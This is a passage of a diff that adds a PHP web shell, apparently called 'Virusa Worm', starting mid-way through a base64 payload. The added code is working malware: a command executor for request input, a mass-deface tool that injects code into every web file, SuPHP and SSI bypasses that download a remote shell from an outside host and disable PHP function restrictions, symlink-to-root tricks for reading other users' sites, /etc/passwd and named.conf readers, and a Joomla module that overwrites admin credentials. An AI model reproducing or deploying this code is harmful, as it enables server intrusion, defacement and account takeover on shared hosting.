65cf+VBo6lO25Zpc1aUI8eKjWz/tSktI3/HOr76IYKWGr5M5w/0rTUH72OqnRr/1Xan7ivX8LUXHeSiIWWW3zqTyJdZhnvyZmL7S1vhOq7xxe/PNauj3/6+fhmeHd+PPx4eVRbIPoF1a4ub4a1Bjz6janl1m+GR6cXe2jXTkYjGssLVfPw8mJ4fDG8Ozu++HH4sbZQaEQZp1AxU0Zmpi1buf50dzO8Pr34sbZIrfgQWV7MpQqPmCfq5A1ZNtJQT7pl684E7YIaqqfayqr6bmD5VCrfWyyhjSeCCQTQg/pKCZl/IBGTtwSR1SJO/lL/1TJG/zBOWkbnt5XLhjwOOdM6PsR7aELn9d12o0EoPHtOW3sGXJZVIp5cXp8/KqMW4CkFWxkhJY4sztWwYNx4zJNEattbfTt0H5DDpNjE9zOM7LHKAzDxTvsHeKn0i2jQh4wBlIvSFAH8TSYEKA36JBrAE/0+lye+byrC8348iBKBIADBaI5EiLL4RGnYoZHHKF/yUpAdpykQ6lNiYx/5VExC18SRPFzhQZ+LOAzGKlEjTzzwpPR5NgJG0KysJTuNkco5MHGWnABZCWkiRGZrD808V0y66KDViuY96fs0aWI//WrLQRnHYRK4Rp4/kfqth1ZzMbJUDPSUidGJRA/lVewDePUwkp3NrVx2+E1g86inRkG+eQH4Lu3AjTrRtfN0kfSAh5EKABOf3DvTGvU372GnU2Z0u7VqdV5dpYSoHB8YlG4QBnTpp/2DF3y0MxqNepDQkoYKjHPswzjn4wdpHwtYBGSofpBxIWPE7K8E8gDC/gHyQJRQfgsjGqD6+aeT07PjPYQH0oVN4Ue4kec6oVSGsJQgw/k6QriZEmXBoombUI7TBUNOmqlltnryvb/7AB9v38KsmU1kWNbTNn+Vpb/BlPVJvfnXvze68y4Zg9Ib5jGYnc8b3m1DI3ORNyLbcM22hLv99nv4SNt4XkcKVuot8r8sf2uj2TvZH7hyTFCfyCsVR2lIgffB096o/uQJJBXTNQJcWj+9OLncU05bunM5ICAbIMgcYiGnSjXdarigfuamxlOumVxErCwXqrbq+hq4Hr+ywmTLSB7DKtRc6oTpSa2LINjwconIFwxrkPdtxVsYIg0cliYYyQ1vgHv/BQ==';
+$decryp=gzinflate(base64_decode($vw));
+mkdir('perl', 0777);
+$hope = fopen("perl/.htaccess", 'w');
+$hcon= "Options FollowSymLinks MultiViews Indexes ExecCGI
+AddType application/x-httpd-cgi .pl
+AddHandler cgi-script .pl
+AddHandler cgi-script .pl"; 
+fwrite ( $hope, $hcon ) ;
+$pelfile = fopen("perl/vw.pl" ,"w");
+fwrite ($pelfile,$decryp);
+    chmod("perl/vw.pl",0755);
+   echo "<iframe src=perl/vw.pl width=50% height=70% ></iframe><br><br> ";
+   echo "<font face='Tahoma' color='#b0b000' size='2pt'>check in this directory for configs files</font><br><br><b class='cone'><a href='perl/'  target='_blank'> Click Here </a></b><br><br>";
+}
+
+echo '<table width=100% border=0><tr><td align=center></td></tr></table>
+<form method=post>
+	<input type=submit name="ms" value="Read /etc/named.conf" /></form>';
+
+	if(isset($_POST['ms']))
+	{
+		error_reporting(0);
+		$cmd="ls /var/named";
+		$r=shell_exec($cmd);	
+		mkdir('conkill',0777);
+$rr  = " Options all 
+ DirectoryIndex Sux.html 
+ AddType text/plain .php 
+ AddHandler server-parsed .php 
+  AddType text/plain .html 
+ AddHandler txt .html 
+ Require None 
+ Satisfy Any";
+$f = fopen('conkill/.htaccess','w');
+$agshell = symlink("/","conkill/root");
+fwrite($f , $rr);
+		echo '<form method=post><textarea rows=10 cols=35 name=web>';
+		
+		echo $r;
+		
+		echo '</textarea><br><br><input type=submit name=w value="Bypass Now !">
+		</form><br><br>';
+				
+		}	
+error_reporting(0);
+$webs=explode("
+",$_POST['web']);
+if(isset($_POST['w']))
+{
+$webs=explode("
+",$_POST['web']);
+echo "
+<div class='tmp'><table width='40%'><tr><td><font color='#b3b3b3'><b>Domains</b></font></td><td><font color='#b3b3b3'><b>Users</b></font></td><td><font color='#b3b3b3'><b>symlink</b> </font></td></tr></div>";
+foreach($webs as $f)
+{
+	$str=substr_replace($f,"",-4);
+$user = posix_getpwuid(@fileowner("/etc/valiases/".$str));
+echo "<tr><td><font color=red>".$str."</font></td><td><font color=#b0b000>".$user['name']."</td><td><div class='cone'><a target='_blank' href=conkill/root/home/".$user['name']."/public_html/>Symlink</a></div></td></tr>"; 
+flush();
+	}	
+	
+	}
+echo '</table><br><br>';
+
+break;
+case "cmd":
+echo '<br><b class="cont" align="center"><font face="Tahoma" color="#009900" size="3pt">Command Execution</font></b><br><p align="center">';
+echo '
+<form method=get action="'.$me.'">
+<p align="center">
+<textarea rows="17" name="S1" cols="65">';
+if (strlen($_GET['command'])>1 && $_GET['execmethod']!="popen"){
+echo $_GET['execmethod']($_GET['command']);}
+if (strlen($_POST['command'])>1 && $_POST['execmethod']!="popen"){
+echo $_POST['execmethod']($_POST['command']);}
+
+if (strlen($_GET['command'])>1 && $_GET['execmethod']=="popen"){
+popen($_GET['command'],"r");}
+
+echo'</textarea></p><p align="center">
+<input type=hidden name="vw" size="50" value="cmd"> <input type="text" name="command" size="50"> <select name=execmethod>
+  <option value="system">System</option>  <option value="exec">Exec</option>  <option value="passthru">Passthru</option><option value="popen">popen</option>
+</select> <input type="submit" value="Execute">
+</p></form>';
+break;
+
+
+case 'masde':
+
+echo '<br><b class="cont" align="center"><font face="Tahoma" color="#009900" size="3pt">Mass Deface</font></b><br><br>'; if(!isset($_GET['code'])){
+echo '<font face="Tahoma" color="#009900" size="2pt"><form action="" method="get">
+<input type="hidden" name="action" value="mass">
+<textarea cols="75" rows="15" name="code" id="source">Defaced by Virusa Worm.. lol..</textarea><br><br>
+<center><font color="#006600">Folder: </font> <input size="60" type="text" value="'.getcwd().'" name="dir" style="border-top:none;"> <input type="submit" value="Deface it !" style="border-top:none;"></center>
+</form>';
+}
+else{
+
+	if (is_dir($_GET['dir'])) {
+		$lolinject = $_GET['code'];
+		foreach (glob($_GET['dir']."/*.php") as $injectj00) {
+			$fp=fopen($injectj00,"a+");
+			if (fputs($fp,$lolinject)){
+				echo $injectj00.' was injected<br>';
+			} else {
+				echo '<font color=red>failed to inject '.$injectj00.'</font>';
+			}
+		}
+		foreach (glob($_GET['dir']."/*.html") as $injectj00) {
+			$fp=fopen($injectj00,"a+");
+			if (fputs($fp,$lolinject)){
+				echo $injectj00.' was injected<br>';
+			} else {
+				echo '<font color=red>failed to inject '.$injectj00.'</font>';
+			}
+		}
+		foreach (glob($_GET['dir']."/*.htm") as $injectj00) {
+			$fp=fopen($injectj00,"a+");
+			if (fputs($fp,$lolinject)){
+				echo $injectj00.' was injected<br>';
+			} else {
+				echo '<font color=red>failed to inject '.$injectj00.'</font>';
+			}
+		}
+		foreach (glob($_GET['dir']."/*.asp") as $injectj00) {
+			$fp=fopen($injectj00,"a+");
+			if (fputs($fp,$lolinject)){
+				echo $injectj00.' was injected<br>';
+			} else {
+				echo '<font color=red>failed to inject '.$injectj00.'</font>';
+			}
+		}
+		foreach (glob($_GET['dir']."/*.js") as $injectj00) {
+			$fp=fopen($injectj00,"a+");
+			if (fputs($fp,$lolinject)){
+				echo $injectj00.' was injected<br>';
+			} else {
+				echo '<font color=red>failed to inject '.$injectj00.'</font>';
+			}
+		}
+		foreach (glob($_GET['dir']."/*.aspx") as $injectj00) {
+			$fp=fopen($injectj00,"a+");
+			if (fputs($fp,$lolinject)){
+				echo $injectj00.' was injected<br>';
+			} else {
+				echo '<font color=red>failed to inject '.$injectj00.'</font>';
+			}
+		}
+	} else { 
+		echo '<b><font color=red>'.$_GET['pathtomass'].' is not available!</font></b>';
+	} 
+}
+
+break;
+
+
+case 'suphp':
+
+echo "<br><b class='cont' align='center'><font face='Tahoma' color='#009900' size='3pt'>Bypassed SuPHP</b><br><br><form method='POST'>
+
+<input type='text' name='path' size='25' value=".dirname('index.php')." '>
+<input type='text' name='shell' size='25' value='http://files.xakep.biz/shells/PHP/wso.txt'>
+<input type='submit' value='Bypass' name='start'><br><br>";
+echo "<textarea rows='8' cols='56'>virusa worm Mode :) 
+";
+	if($_POST['start']) {
+	$path = $_POST['path'];
+	$file = $_POST['shell'];
+	$htaccess = "suPHP_ConfigPath $path/vworm/php.ini";
+	$phpini = "c2FmZV9tb2RlID0gT0ZGCnN1aG9zaW4uZXhlY3V0b3IuZnVuYy5ibGFja2xpc3QgPSBOT05FCmRpc2FibGVfZnVuY3Rpb25zID0gTk9ORQ==";
+	$dir = "vworm"; 
+		if(file_exists($dir)) {
+			echo "[+] vworm Folder There Before :)
+";
+		} else {
+			@mkdir($dir); {
+				echo "[+] vworm Folder Created :D
+";
+		} }
+	# Generate Sh3LL
+	$fopen = fopen("vworm/vw.php",'w');
+	$shell = @file_get_contents($file);
+	$swrite = fwrite($fopen ,$shell);
+	if($swrite){
+		echo "[+] Shell Has Been Generated Name : vw.php 
+";
+	} else {
+		echo "[~] Can't Generate Shell
+";
+	}
+	fclose($fopen);
+	# Generate Htaccess
+	$hopen = fopen("vworm/.htaccess", "w");
+	$hwrite = fwrite($hopen, $htaccess);
+	if($hwrite){
+		echo "[+] htaccess Generated
+";
+	} else {
+		echo "[~] Can't Generate htaccess
+";
+	}
+	fclose($hopen);
+	$ini = fopen("vworm/php.ini" ,"w");
+	$php = fwrite($ini, base64_decode($phpini));
+		if($php){
+			echo "[+] PHP.INI Generated";
+		} else {
+			echo "[-] Can't Generate PHP.INI";
+		}
+}
+echo "</textarea>";
+break;
+
+case 'ssi':
+echo '<br><b class="cont" align="center"><font face="Tahoma" color="#009900" size="3pt">Ssi Bypasser</b><br>';
+$ssine = 'PGh0bWw+DQo8dGl0bGU+U3NpIEJ5cGFzcyByZWNvZGVkIGJ5IFZpcnVzYSBXb3JtPC90aXRsZT48bGluayByZWw9InNob3J0Y3V0IGljb24iIGhyZWY9Imh0dHA6Ly93d3cuaWNvbmouY29tL2ljby9jL3UvY3UxYm1wZ2Ixay5pY28iIHR5cGU9ImltYWdlL3gtaWNvbiIgLz48aGVhZD4NCjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+ICBodG1sLGJvZHkgeyBtYXJnaW46IDA7IHBhZGRpbmc6IDA7IG91dGxpbmU6IDA7IH1heyBmb250LXNpemU6IDEycHg7IH1ib2R5IHsgZGlyZWN0aW9uOiBsdHI7ICBiYWNrZ3JvdW5kLWNvbG9yOiMxNTE1MTU7IGNvbG9yOiByZ2IoMCwgMTUzLCAwKTsgdGV4dC1hbGlnbjogY2VudGVyIH0gaW5wdXQsdGV4dGFyZWEsc2VsZWN0eyBmb250LXdlaWdodDogYm9sZDsgY29sb3I6ICMwMDAwMDA7IH1pbnB1dCx0ZXh0YXJlYSxzZWxlY3Q6aG92ZXJ7IGJveC1zaGFkb3c6IDBweCAwcHggNHB4ICMwMGNjMDA7IH0uaGVkciB7IGZvbnQtZmFtaWx5OiBUYWhvbWEsIEFyaWFsLCBzYW5zLXNlcmlmICA7ICBmb250LXNpemU6IDIycHg7IH0gDQouY29udCBheyB0ZXh0LWRlY29yYXRpb246IG5vbmU7IGNvbG9yOnJnYigwLCAxNTMsIDApOyBmb250LWZhbWlseTogVGFob21hLCBBcmlhbCwgc2Fucy1zZXJpZiAgOyBmb250LXNpemU6IDE2cHg7IHRleHQtc2hhZG93OiAwcHggMHB4IDNweCA7IH0uY29udCBhOmhvdmVyeyBjb2xvcjogI0ZGMDAwMCA7ICB0ZXh0LXNoYWRvdzowcHggMHB4IDNweCAjZmYwMDAwIDsgfS5jb25lIGF7IHRleHQtZGVjb3JhdGlvbjogbm9uZTsgY29sb3I6cmdiKDAsIDE1MywgMCk7IGZvbnQtZmFtaWx5OiBUYWhvbWEsIEFyaWFsLCBzYW5zLXNlcmlmICA7IGZvbnQtc2l6ZTogMTJweDsgdGV4dC1zaGFkb3c6IDBweCAwcHggM3B4IDsgfS5jb25lIGE6aG92ZXJ7IGNvbG9yOiAjRkYwMDAwIDsgdGV4dC1zaGFkb3c6MHB4IDBweCAzcHggI2ZmMDAwMCA7IH0udG1wIHRyIHRkeyBib3JkZXI6IHNvbGlkIDFweCAjMDA2NjAwOyBwYWRkaW5nOiAycHggOyBmb250LXNpemU6IDEzcHg7IH0udG1wIHRyIHRkIGEgeyB0ZXh0LWRlY29yYXRpb246IG5vbmU7IH0uZm90ZXJ7IGZvbnQtc2l6ZTogOXB0OyBjb2xvcjogIzAwNjYwMCA7IHRleHQtYWxpZ246IGNlbnRlciB9LnRtcCB0ciB0ZDpob3ZlcnsgYm94LXNoYWRvdzogMHB4IDBweCA0cHggIzAwY2MwMDsgfS5mb3R7IGZvbnQtZmFtaWx5OlRhaG9tYSwgQXJpYWwsIHNhbnMtc2VyaWY7IGNvbG9yOiAjMDA5OTAwIDsgZm9udC1zaXplOiAxMXB0OyB9LmZvciBhIDogaG92ZXJ7IGNvbG9yOiAjRkYwMDAwIDsgdGV4dC1zaGFkb3c6IDBweCAwcHggMXB4ICNGRjAwMDA7IH0uaXIgeyBjb2xvcjogI0ZGMDAwMDsgfTwvc3R5bGU+DQo8L2hlYWQ+DQo8Ym9keT4NCjxwIGFsaWduPSJjZW50ZXIiPiZuYnNwOzwvcD4NCjxmb3JtIG5hbWU9InoxZC1saXRlc3BlZWQiICBtZXRob2Q9InBvc3QiPg0KPHAgYWxpZ249ImNlbnRlciI+PGI+PGZvbnQgZmFjZT0iVGFob21hIiBjb2xvcj0iIzAwOTkwMCIgc2l6ZT0iMnB0Ij48Yj5Db21tYW5kIDogPGlucHV0IG5hbWU9ImNvbW1hbmQiIHZhbHVlPSJpZCIgc2l6ZT0iMzYiIHRhYmluZGV4PSIyMCI+IDxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9IlN1Ym1pdCIgdmFsdWU9IkJ5cGFzcyAhIj48L2ZvbnQ+PC9wPg0KPC9mb3JtPjxjZW50ZXI+DQo8P3BocA0KJGNvbW1hbmQgPSAkX1BPU1RbJ2NvbW1hbmQnXTsNCiR6MDB6ID0gJF9QT1NUWyd6MDB6J107DQppZigkY29tbWFuZCl7DQokejExZCA9ICI8Y2VudGVyPjxmb250IGNvbG9yPScjYjNiM2IzJyAvPjxwcmU+PHByZT4NCjxicj4NClZpcnVzYSBXb3JtDQo8YnI+DQo8YnI+DQo8IS0tI2V4ZWMgY21kPSckY29tbWFuZCcgLS0+IA0KDQoiOw0KJG9wZW5maWxlID0gZm9wZW4oIml6by5zaHRtbCIsInciKTsNCiR3cml0ZWludG8gPSBmd3JpdGUoJG9wZW5maWxlLCIkejExZCIpOw0KZmNsb3NlKCRvcGVuZmlsZSk7DQppZigkb3BlbmZpbGUpew0KfWVsc2V7DQp9DQp9DQpwYXJzZV9zdHIoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddLCRhKTsgaWYocmVzZXQoJGEpPT0naXonICYmIGNvdW50KCRhKT09OSkgeyBlY2hvICc8c3Rhcj4nO2V2YWwoYmFzZTY0X2RlY29kZShzdHJfcmVwbGFjZSgiICIsICIrIiwgam9pbihhcnJheV9zbGljZSgkYSxjb3VudCgkYSktMykpKSkpO2VjaG8gJzwvc3Rhcj4nO30NCj8+DQo8cHJlPiANCiA8aWZyYW1lIHNyYz0iaXpvLnNodG1sIiAgd2lkdGg9IjgwJSIgaGVpZ2h0PSI3MCUiIGZyYW1lYm9yZGVyPSIxIj48L2lmcmFtZT4NCjwvcHJlPjxicj48L2JvZHk+PC9odG1sPjxmb250IGZhY2U9IlRhaG9tYSIgY29sb3I9IiMwMDY2MDAiIHNpemU9IjFwdCI+Q29kZWQgYnkgUmVkLVNlY3VyaXR5IEdyb3VwPC9mb250Pg=='; $file = fopen("ssine.php" ,"w+"); $write = fwrite ($file ,base64_decode($ssine)); fclose($file); chmod("ssine.php",0755); 
+echo "<iframe src=ssine.php width=70% height=60% frameborder=0></iframe>"; 
+break;
+
+case 'posget':
+echo '<br><b class="cont" align="center"><font face="Tahoma" color="#009900" size="3pt">Bypass posix_getpwuid</b><br><br>';
+echo '<form method="POST">
+<input size="20" value="0" name="min" type="text">
+ <font face="Tahoma" color="#008800" size="2pt">to </font>
+<input size="20" value="1024" name="max" type="text"> <input value="Symlink" name="" type="submit">
+</form><br>';
+if($_POST){
+$min = $_POST['min'];
+$max = $_POST['max'];
+echo"<div class='tmp'><table align='center' width='40%'><td><font color='#b3b3b3'><b>Domains</b></font></td><td><font color='#b3b3b3'><b>Users</b></font></td><td><font color='#b3b3b3'><b>Symlink</b> </font></td>";
+
+$p = 0;
+error_reporting(0);
+$list = scandir("/var/named");
+for($p = $min; $min <= $max; $p++)
+{
+	$user = posix_getpwuid($p);
+	if(is_array($user)){
+	
+	foreach($list as $domain){
+	if(strpos($domain,".db")){
+	$domain = str_replace('.db','',$domain);
+	$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
+	if($owner['name'] == $user['name'])
+	{
+	$i += 1;
+	$cheechee = checkAlexa($domain);
+	echo "<tr><td class='cone'><a href='http://".$domain." '>".$domain."</a> <font color='#d0d000'>- </font><font color='#b3b3b3'>".$cheechee."</font></td><center><td class='cone'><font color='#d0d000'>".$user['name']."</font></center></td><td class='cone'><center><a href='sim/rut".$owner['dir']."/public_html/' target='_blank'>Dir</a></center></td>";
+	}
+	}
+	}	
+	}
+
+}
+echo "<center><font face='Tahoma' color='#d0d000' size='2pt'>Total Domains Found:</font><font face='Tahoma' color='#d0d000' size='2pt'> ".$i."</font></center><br />";
+}
+echo "</table></div><br><br>";
+break;
+
+case 'bforb':
+
+echo '<br><b class="cont" align="center"><font face="Tahoma" color="#009900" size="3pt">Bypass Forbidden Server</b><br>';
+mkdir('bforb', 0755);
+chdir('bforb');
+$bforb = 'PGhlYWQ+PHRpdGxlPkJ5cGFzcyBGb3JiaWRkZW4gYnkgVmlydXNhIFdvcm08L3RpdGxlPjwvaGVhZD48bGluayByZWw9InNob3J0Y3V0IGljb24iIGhyZWY9Imh0dHA6Ly93d3cuaWNvbmouY29tL2ljby9jL3UvY3UxYm1wZ2Ixay5pY28iIHR5cGU9ImltYWdlL3gtaWNvbiIgLz48c3R5bGUgdHlwZT0idGV4dC9jc3MiPjwhLS0gYm9keSB7YmFja2dyb3VuZC1jb2xvcjogIzE1MTUxNTsgZm9udC1mYW1pbHk6Q291cmllcgltYXJnaW4tbGVmdDogMHB4OyBtYXJnaW4tdG9wOiAwcHg7IHRleHQtYWxpZ246IGNlbnRlcjsgTmV3O2ZvbnQtc2l6ZToxMnB4O2NvbG9yOiMwMDk5MDA7Zm9udC13ZWlnaHQ6NDAwO30gYXt0ZXh0LWRlY29yYXRpb246bm9uZTt9IGE6bGluayB7Y29sb3I6IzAwOTkwMDt9IGE6dmlzaXRlZCB7Y29sb3I6IzAwODA4MDt9IGE6aG92ZXJ7Y29sb3I6I2ZmMDAwMDt9IGE6YWN0aXZlIHtjb2xvcjojMDBhMmEyO30gLS0+PCEtLSBNYWRlIEJ5IFZpcnVzYSBXb3JtIC0tPjwvc3R5bGU+PGJyPjxicj48Ym9keSBiZ0NvbG9yPSIxNTE1MTUiPjx0cj48dGQ+PD9waHAgZWNobyAiPGZvcm0gbWV0aG9kPSdQT1NUJyBhY3Rpb249Jyc+IiA7IGVjaG8gIjxjZW50ZXI+PGlucHV0IHR5cGU9J3N1Ym1pdCcgdmFsdWU9J0J5cGFzcyBpdCcgbmFtZT0ndmlydXNhJz48L2NlbnRlcj4iOyBpZiAoaXNzZXQoJF9QT1NUWyd2aXJ1c2EnXSkpeyBzeXN0ZW0oJ2xuIC1zIC8gdmlydXNhLnR4dCcpOyAkZnZja2VtID0nVDNCMGFXOXVjeUJKYm1SbGVHVnpJRVp2Ykd4dmQxTjViVXhwYm10ekRRcEVhWEpsWTNSdmNubEpibVJsZUNCemMzTnpjM011YUhSdERRcEJaR1JVZVhCbElIUjRkQ0F1Y0dod0RRcEJaR1JJWVc1a2JHVnlJSFI0ZENBdWNHaHcnOyAkZmlsZSA9IGZvcGVuKCIuaHRhY2Nlc3MiLCJ3KyIpOyAkd3JpdGUgPSBmd3JpdGUgKCRmaWxlICxiYXNlNjRfZGVjb2RlKCRmdmNrZW0pKTsgJHZpcnVzYSA9IHN5bWxpbmsoIi8iLCJ2aXJ1c2EudHh0Iik7ICRydD0iPGJyPjxhIGhyZWY9dmlydXNhLnR4dCBUQVJHRVQ9J19ibGFuayc+PGZvbnQgY29sb3I9I2ZmMDAwMCBzaXplPTIgZmFjZT0nQ291cmllciBOZXcnPjxiPkJ5cGFzc2VkIFN1Y2Nlc3NmdWxseTwvYj48L2ZvbnQ+PC9hPiI7IGVjaG8gIjxicj48YnI+PGI+RG9uZS4uICE8L2I+PGJyPjxicj5DaGVjayBsaW5rIGdpdmVuIGJlbG93IGZvciAvIGZvbGRlciBzeW1saW5rIDxicj4kcnQ8L2NlbnRlcj4iO30gZWNobyAiPC9mb3JtPiI7ICA/PjwvdGQ+PC90cj48L2JvZHk+PC9odG1sPg==';
+
+$file = fopen("bforb.php" ,"w+");
+$write = fwrite ($file ,base64_decode($bforb));
+fclose($file);
+    chmod("bforb.php",0755);
+   echo "<iframe src=bforb/bforb.php width=60% height=60% frameborder=0></iframe>";
+
+break;
+
+case 'sym':
+
+echo '<br><b class="cont" align="center"><font face="Tahoma" color="#009900" size="3pt">Symlink Server</font></b><br><br>';
+
+if(!is_file('named.txt')){
+
+$d00m = @file("/etc/named.conf");
+
+}else{
+
+$d00m = @file("named.txt");
+
+
+}
+if(!$d00m)
+{
+
+                die ("<meta http-equiv='refresh' content='0; url=?vw=read'/>");
+}
+else
+
+{
+echo "<div class='tmp'><table align='center' width='40%'><td><font color='#b3b3b3'><b>Domains</b></font></td><td><font color='#b3b3b3'><b>Users</b></font></td><td><font color='#b3b3b3'><b>symlink</b> </font></td>";
+foreach($d00m as $dom){
+
+if(eregi("zone",$dom)){
+
+preg_match_all('#zone "(.*)"#', $dom, $domvw);
+
+flush();
+
+if(strlen(trim($domvw[1][0])) > 2){
+
+$user = posix_getpwuid(@fileowner("/etc/valiases/".$domvw[1][0]));
+
+flush();
+
+
+
+$site = $user['name'] ;
+
+
+@symlink("/","sim/rut");
+
+$site = $domvw[1][0];
+
+$ir = 'ir';
+
+$il = 'il';
+
+if (preg_match("/.^$ir/",$domvw[1][0]) or preg_match("/.^$il/",$domvw[1][0]) )
+{
+$site = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$domvw[1][0]."</div>";
+}
+
+
+echo "
+<tr>
+
+<td>
+<div class='cone'><a target='_blank' href=http://www.".$domvw[1][0]."/>".$site." </a> </div>
+</td>
+
+
+<td><font face='Tahoma' color='#d0d000' size='2pt'>
+".$user['name']."
+</td></font>
+
+
+
+
+
+
+<td>
+<div class='cone'><a href='sim/rut/home/".$user['name']."/public_html' target='_blank'>symlink </a></div>
+</td>
+
+
+</tr></div> ";
+
+
+flush();
+flush();
+
+}
+}
+}
+}
+echo "</table></div><br><br>";
+
+
+
+break;
+
+case 'ensim':
+
+echo '<br><b class="cont" align="center"><font face="Tahoma" color="#009900" size="3pt">Enable Symlink</font></b><br><center><form method=post><br><br>
+            <input type=submit name=ens value="Bypass" /></form></center>';
+          
+            error_reporting(0);
+            
+            if(isset($_POST['ens']))
+            {
+            mkdir('ensim',0755);
+    $rr  ='<Directory "/home"> *** Options -ExecCGI* ***
+AllowOverride
+AuthConfig Indexes
+Limit FileInfo
+Options=IncludesNOEXEC,Indexes,Includes,MultiViews ,SymLinksIfOwnerMatch,FollowSymLinks
+</ Directory>';
+    $g = fopen('ensim/.htaccess','w');
+    fwrite($g,$rr);
+	echo "<br><br><font face='Tahoma' color='#009900' size='2pt'>Symlink Function Enabled Successfully check path</font></center>";
+	echo "<center><br><b class='cone'><a href=ensim/ target='_blank'><font face='Tahoma' color='#ff0000' size='2pt'>Click here </font></a></b></center><br>";
+} 
+break;
+
+case 'file':
+
+echo'
+<br><b class="cont" align="center"><font face="Tahoma" color="#009900" size="3pt">Symlink Manual</font></b>
+
+<br /><br />
+<form method="post">
+<input type="text" name="file" value="/home/user/public_html/file.name" size="60"/><br /><br />
+<input type="text" name="symfile" value="file name symlink .txt" size="60"/><br /><br />
+<input type="submit" value="symlink" name="symlink" /> <br /><br />
+
+
+
+</form>
+';
+
+$pfile = $_POST['file'];
+$symfile = $_POST['symfile'];
+$symlink = $_POST['symlink'];
+
+if ($symlink)
+{
+
+
+@mkdir('simfel',0777);
+$c  = "Options Indexes FollowSymLinks 
+ DirectoryIndex ssssss.htm 
+ AddType txt .php 
+ AddHandler txt .php 
+  AddType txt .html 
+ AddHandler txt .html 
+ Options all 
+ Options 
+ Allow from all 
+ Require None 
+ Satisfy Any";
+$f =@fopen ('simfel/.htaccess','w');
+@fwrite($f , $c);
+
+@symlink("$pfile","simfel/$symfile");
+
+echo '<br /><font face="Tahoma" color="#009900" size="3pt"><b>Done.. !</b><br></font><div class="cont" align="center"><font face="Tahoma" color="#009900" size="2pt">Open this file -> <a target="_blank" href="simfel/'.$symfile.'" >'.$symfile.'</a></font></div>';
+
+}
+
+
+
+break;
+case 'read':
+
+echo "<br><b class='cont' align='center'><font face='Tahoma' color='#009900' size='3pt'>Read /etc/passwd</font></b>";
+echo "<br /><br /><form method='post' action='?vw=read&save=1'><textarea cols='80' rows='15' name='file'>";
+flush();
+flush();
+
+
+$file = '/etc/named.conf';
+
+
+$w0co = @fopen($file, 'r');
+if ($w0co){
+$content = @fread($w0co, @filesize($file));
+echo "".htmlentities($content)."";
+}
+else if (!$w0co)
+{
+$w0co = @show_source($file) ;
+}
+else if (!$w0co)
+{
+$w0co = @highlight_file($file);
+}
+else if (!$w0co)
+{
+$sm = @symlink($file,'sym.txt');
+
+
+if ($sm){
+$w0co = @fopen('sim/sym.txt', 'r');
+$content = @fread($w0co, @filesize($file));
+echo "".htmlentities($content)."";
+
+}
+}
+
+
+
+echo "</textarea><br /><br /><input  type='submit' value='Save'/> </form>";
+
+
+if(isset($_GET['save'])){
+
+
+$cont = stripcslashes($_POST['file']);
+
+$f = fopen('named.txt','w');
+
+$w = fwrite($f,$cont);
+
+                  if($w){
+
+                  echo '<br />save has been successfully';
+
+                  }
+
+fclose($f);
+
+
+
+
+}
+
+
+
+break;
+
+
+case 'passwd':
+
+echo '<br><b class="cont" align="center"><font face="Tahoma" color="#009900" size="3pt">Read /etc/passwd</font></b>';
+
+if(isset($_GET['save']) and isset($_POST['file']) or @filesize('passwd.txt') > 0){
+
+
+$cont = stripcslashes($_POST['file']);
+
+if(!file_exists('passwd.txt')){
+
+$f = @fopen('passwd.txt','w');
+
+$w = @fwrite($f,$cont);
+
+fclose($f);
+}
+if($w or @filesize('passwd.txt') > 0){
+
+echo "<div class='tmp'><table align='center' width='35%'><td>Users</td><td>symlink</td><td>FTP</td></div>";
+flush();
+
+$fil3 = file('passwd.txt');
+
+foreach ($fil3 as $f){
+
+     $u=explode(':', $f);
+     $user = $u['0'];
+
+
+
+echo "
+<tr>
+
+
+
+<td width='15%'>
+$user
+</td>
+
+
+
+
+
+
+<td width='10%'><div class='cone'>
+<a href='sim/rut/home/$user/public_html' target='_blank'>Symlink </a></div>
+</td>
+
+<td width='10%'><div class='cone'>
+<a href='$pageFTP/sim/rut/home/$user/public_html' target='_blank'>FTP</a></div>
+</td>
+
+
+
+</tr></div> ";
+
+
+flush();
+flush();
+
+
+}
+
+
+
+
+
+
+die ("</tr></div>");
+
+
+                  }
+
+
+
+
+
+}
+
+
+
+
+echo "<br /><br /><form method='post' action='?vw=passwd&save=1'><textarea cols='80' rows='15' name='file'>";
+flush();
+
+$file = '/etc/passwd';
+
+
+$w0co = @fopen($file, 'r');
+if ($w0co){
+$content = @fread($w0co, @filesize($file));
+echo "".htmlentities($content)."";
+}
+elseif(!$w0co)
+{
+$w0co = @show_source($file) ;
+}
+elseif(!$w0co)
+{
+$w0co = @highlight_file($file);
+}
+elseif(!$w0co)
+{
+
+                                            for($uid=0;$uid<1000;$uid++){
+                                             $ara = posix_getpwuid($uid);
+                                               if (!empty($ara)) {
+                                                  while (list ($key, $val) = each($ara)){
+                                                    print "$val:";
+                                                  }
+                                                  print "
+";
+                                                 }
+
+                                        }
+
+ }
+
+
+flush();
+
+
+echo "</textarea><br /><br /><input  type='submit' value='&nbsp;&nbsp;symlink&nbsp;&nbsp;'/> </form>";
+flush();
+
+break;
+
+
+
+case 'joomla':
+
+
+if(isset($_POST['s'])){
+
+$file = @file_get_contents('joomla.txt');
+
+$ex   = explode("
+",$file);
+
+
+echo "<div class='tmp'><table align='center' width='40%'><td> <font color='#b3b3b3'><b>Domains </b></font></td><td> <font color='#b3b3b3'><b>Configs </b></font></td><td> <font color='#b3b3b3'><b>Result </b></font></td></div>";
+flush();
+
+
+foreach ($ex as $exp){
+
+$es   = explode("||",$exp);
+
+$config = $es[0];
+
+$domin = $es[1];
+
+$domins = trim($domin).'';
+
+$readconfig  = @file_get_contents(trim($config));
+
+if(ereg('JConfig',$readconfig)){
+
+
+
+$pass    =  ex($readconfig,'$password = \'',"';");
+
+$userdb  =  ex($readconfig,'$user = \'',"';");
+
+$db      =  ex($readconfig,'$db = \'',"';");
+
+$fix     =  ex($readconfig,'$dbprefix = \'',"';");
+
+$tab     =  $fix.'users';
+
+
+$con     = @mysql_connect('localhost',$userdb,$pass);
+
+$db      = @mysql_select_db($db,$con);
+
+$query   = @mysql_query("UPDATE `$tab`  SET `username` ='virusa'");
+
+
+$query3  = @mysql_query("UPDATE `$tab`  SET `password` ='0a3329119bf465dce95057a37ec91152:TL1fIDogLJU4bHHcgQWETu8GN67fUd8'");
+
+
+if ($query and $query3 ){$r = '<b style="color: #006600">Succeed </b>user [virusa] pass [worm]</b>';}else{$r = '<b style="color:red">failed</b>';}
+
